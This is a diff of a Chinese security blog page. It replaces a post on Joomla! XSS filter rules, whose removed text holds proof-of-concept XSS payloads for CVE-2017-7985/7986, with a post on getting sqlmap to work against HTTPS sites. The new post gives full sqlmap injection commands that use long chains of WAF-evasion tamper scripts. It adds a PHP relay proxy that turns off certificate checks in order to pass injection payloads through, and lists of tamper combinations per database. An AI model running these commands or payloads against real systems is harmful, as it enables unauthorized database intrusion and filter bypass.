@@ -4,32 +4,25 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>Joomla! XSS过滤规则 | MSAREHERE</title>
+    <title>sqlmap在https情况下的一个错误 | MSAREHERE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="MS">
     
 
     
-    <meta name="description" content="Joomla! XSS过滤规则">
-<meta name="keywords" content="XSS,Joomla!">
+    <meta name="description" content="对于https网站，使用sqlmap可能会出现如下错误。使用–force-ssl无效。[14:19:03] [CRITICAL] can’t establish SSL connection">
+<meta name="keywords" content="HTTPS,注入,SQLMAP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Joomla! XSS过滤规则">
-<meta property="og:url" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/index.html">
+<meta property="og:title" content="sqlmap在https情况下的一个错误">
+<meta property="og:url" content="https://michaelwayneliu.github.io/2018/08/28/sqlmap在https情况下的一个错误/index.html">
 <meta property="og:site_name" content="MSAREHERE">
-<meta property="og:description" content="Joomla! XSS过滤规则">
+<meta property="og:description" content="对于https网站，使用sqlmap可能会出现如下错误。使用–force-ssl无效。[14:19:03] [CRITICAL] can’t establish SSL connection">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/1.png">
-<meta property="og:image" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/2.png">
-<meta property="og:image" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/3.png">
-<meta property="og:image" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/4.png">
-<meta property="og:image" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/5.png">
-<meta property="og:image" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/6.png">
-<meta property="og:updated_time" content="2018-01-19T09:00:03.422Z">
+<meta property="og:updated_time" content="2018-08-28T03:45:29.125Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Joomla! XSS过滤规则">
-<meta name="twitter:description" content="Joomla! XSS过滤规则">
-<meta name="twitter:image" content="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/1.png">
+<meta name="twitter:title" content="sqlmap在https情况下的一个错误">
+<meta name="twitter:description" content="对于https网站，使用sqlmap可能会出现如下错误。使用–force-ssl无效。[14:19:03] [CRITICAL] can’t establish SSL connection">
 
     
     <link rel="alternative" href="/atom.xml" title="MSAREHERE" type="application/atom+xml">
@@ -93,14 +86,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/01/19/Joomla-XSS过滤规则/" title="Joomla! XSS过滤规则" itemprop="url">Joomla! XSS过滤规则</a>
+      <a href="/2018/08/28/sqlmap在https情况下的一个错误/" title="sqlmap在https情况下的一个错误" itemprop="url">sqlmap在https情况下的一个错误</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="MS" target="_blank" itemprop="author">MS</a>
 		
   <p class="article-time">
-    <time datetime="2018-01-19T08:51:46.000Z" itemprop="datePublished"> 发表于 2018-01-19</time>
+    <time datetime="2018-08-28T03:44:13.000Z" itemprop="datePublished"> 发表于 2018-08-28</time>
     <span id="busuanzi_container_page_pv">
     总阅读<span id="busuanzi_value_page_pv"></span>次
 </span>
@@ -115,10 +108,23 @@
 		
 		</div>
 		
-		<p>Joomla! XSS过滤规则<br><a id="more"></a><br>基于CVE-2017-7985&amp;7986，利用方式参考<a href="http://bobao.360.cn/learning/detail/3817.html" target="_blank" rel="noopener">这里</a>，payload很有意思<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;form /&gt;&lt;button formaction=&quot;javascript&amp;colon;alert(1)&quot;&gt;heihei&lt;/button&gt;</span><br><span class="line">2.style=&quot;background:url()&apos;&quot;&gt;&amp;colon;</span><br><span class="line">&lt;img src=x onerror=alert(1) x=&lt;a href=&quot;test&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure></p>
-<p>看看它的过滤规则：<br>1.过滤属性值—&gt;转义属性值引号间的&lt; &gt;  “三个符号。<br><img src="/2018/01/19/Joomla-XSS过滤规则/1.png" alt="image"><br>2.去除/<em>**</em>/，把类似“:expression(”的”:expression”全去掉<br>3.去掉所有匹配&gt;的多余的&lt;，比如&lt;&lt;&lt;&lt;&gt;   ——&gt;   &lt;&gt;<br>4.&lt;&gt;没闭合，就取最后一个&lt;后的内容，前面都忽略<br>5.如果标签嵌套如&lt;&lt;<img src="">&gt;&gt;，迭代取到最里面的标签<img src="">判断<br>6.取出标签名，不是数字字母组成舍弃，没有标签名舍弃，在黑名单舍弃<br><img src="/2018/01/19/Joomla-XSS过滤规则/2.png" alt="image"><br><img src="/2018/01/19/Joomla-XSS过滤规则/3.png" alt="image"></p>
-<p>7.根据空格定界属性和属性值，根据=号分割属性和属性值。如果之后没有=号，就把属性值一直取到/处。属性值被引号包围，就把它从引号中取出来，否则就取到下一个括号的地方。<br><img src="/2018/01/19/Joomla-XSS过滤规则/4.png" alt="image"><br>8.过滤属性及属性值。多个属性值取最后一个。去除属性值空格、实体编码值、\n\r、双引号、反斜杠。<br><img src="/2018/01/19/Joomla-XSS过滤规则/5.png" alt="image"><br><img src="/2018/01/19/Joomla-XSS过滤规则/6.png" alt="image"></p>
-<p>就这样joomla!都被搞了，继续学习吧~</p>
+		<p>对于https网站，使用sqlmap可能会出现如下错误。使用–force-ssl无效。<br>[14:19:03] [CRITICAL] can’t establish SSL connection<br><a id="more"></a><br>对于https网站，使用sqlmap可能会出现如下错误。使用–force-ssl无效。<br>[14:19:03] [CRITICAL] can’t establish SSL connection</p>
+<p>方法一:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u https://www.xxxx.com/?id=2* --level 5 --risk 3 --dbms MYSQL --tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords --proxy http://127.0.0.1:8888 --random-agent</span><br></pre></td></tr></table></figure>
+<p>127.0.0.1:8888是本地charles地址</p>
+<p>方法2：</p>
+<p>本地建立proxy.php，内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$url = &quot;https://xxxxx.com/id=2&quot;;</span><br><span class="line">$sql = $_GET[s];</span><br><span class="line">$s = urlencode($sql);</span><br><span class="line">$url = $url.$sql;</span><br><span class="line">// $params = &quot;email=$s&amp;password=aa&quot;;</span><br><span class="line">//echo $params;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, &apos;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&apos;);</span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, 15);</span><br><span class="line">  </span><br><span class="line">// curl_setopt($ch, CURLOPT_POST, 1);    // post 提交方式</span><br><span class="line">// curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line">  </span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo $output;</span><br><span class="line">$a = strlen($output);</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure></p>
+<p>使用下面语句忽略证书</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts</span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);</span><br></pre></td></tr></table></figure>
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/proxy.php?s=2* --level 5 --risk 3 --dbms MYSQL --tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords  --random-agent</span><br></pre></td></tr></table></figure>
+<p>最后分享下一些tamper组合姿势</p>
+<blockquote>
+<p>一般：<br>tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</p>
+<p>MSSQL：<br>tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</p>
+<p>MySQL的：<br>tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor</p>
+</blockquote>
+<p>参考文章：<a href="https://www.cnblogs.com/depycode/p/5288243.html" target="_blank" rel="noopener">https://www.cnblogs.com/depycode/p/5288243.html</a></p>
   
 	</div>
 
@@ -127,13 +133,13 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/前端安全/">前端安全</a>
+  <a class="article-category-link" href="/categories/工具/">工具</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/XSS/">XSS</a><a href="/tags/Joomla/">Joomla!</a>
+  <span></span> <a href="/tags/HTTPS/">HTTPS</a><a href="/tags/注入/">注入</a><a href="/tags/SQLMAP/">SQLMAP</a>
   </div>
 
 </div>
@@ -142,7 +148,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="https://michaelwayneliu.github.io/2018/01/19/Joomla-XSS过滤规则/" data-title="Joomla! XSS过滤规则 | MSAREHERE" data-tsina="2639885925" class="share clearfix">
+	  <div data-url="https://michaelwayneliu.github.io/2018/08/28/sqlmap在https情况下的一个错误/" data-title="sqlmap在https情况下的一个错误 | MSAREHERE" data-tsina="2639885925" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -155,19 +161,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2018/08/28/【CTF】MD5截断比较/" title="【CTF】MD5截断比较">
-  <strong>上一篇：</strong><br/>
-  <span>
-  【CTF】MD5截断比较</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2018/01/13/一例js混淆分析/"  title="一例js混淆分析">
+<a href="/2018/08/28/JS内网主机扫描和端口扫描姿势总结/"  title="JS内网主机扫描和端口扫描姿势总结">
  <strong>下一篇：</strong><br/> 
- <span>一例js混淆分析
+ <span>JS内网主机扫描和端口扫描姿势总结
 </span>
 </a>
 </div>
